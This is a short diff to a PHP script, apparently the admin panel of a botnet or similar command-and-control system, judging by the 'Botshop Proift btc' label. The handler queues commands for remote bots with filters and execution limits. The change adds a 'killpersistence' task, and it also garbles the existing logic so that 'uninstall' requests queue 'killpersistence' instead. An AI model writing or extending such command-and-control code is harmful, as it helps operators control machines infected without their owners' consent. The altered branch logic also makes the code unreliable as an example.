@@ -232,9 +232,9 @@ Botshop Proift btc $
                 if(!empty($_POST["limit"])){
                     $exectionLimit = $_POST["limit"];
                 }
-                if($_POST["task"] == "uninstall") {
+                if($_POST["task"] == "uninstall" || $_POST["task"] == "killpersistence") {
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
-                    $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"], $exectionLimit));
+                    $statement->execute(array(json_encode($filter), 1, 'killpersistence', $_POST["task"], $exectionLimit));
                 }else{
                     if(empty($_POST["command"])){
                         die("Please Input a Command");
